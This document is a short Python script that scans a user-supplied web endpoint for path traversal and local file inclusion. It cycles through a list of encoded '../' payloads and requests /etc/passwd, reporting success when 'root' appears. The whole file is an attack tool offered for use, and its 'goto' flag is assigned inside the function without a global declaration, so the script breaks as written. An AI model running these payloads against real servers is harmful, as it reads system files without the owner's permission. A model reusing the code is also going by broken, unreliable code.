import requests
list_of_exploits = ["../","..//",'..\\','..\\/',"..././","...\.\\/","....//","%2e%2e%2f","%252e%252e%252f", "%c0%ae%c0%ae%c0%af", "%uff0e%uff0e%u2215","%uff0e%uff0e%u2216"]
print(list_of_exploits)
url_endpoint = input("Enter the URL endpoint\n>")
common_output = input("Enter a common output that comming for wrong path\n>")
goto = 0
def LFI():
    url = url_endpoint + "/etc/passwd"
    r2 = requests.get(url)
    if "root" in r2.text or common_output not in r2.text:
                print(f"Found: {url}")
    else:
        for i in list_of_exploits:
            if goto == 1:
                break
            payload = i
            print('\033[91m'+f"Trying {i}")
            for j in range(4):
                exploit = url_endpoint + payload + "etc/passwd"
                r = requests.get(exploit)
                if "root" in r.text or common_output not in r.text:
                    print('\033[92m'+f"Found: {exploit}")
                    goto = 1
                    break
                else:
                    # print('\033[91m'+f"False: {exploit}")
                    payload+=i
if __name__ == '__main__':
    LFI()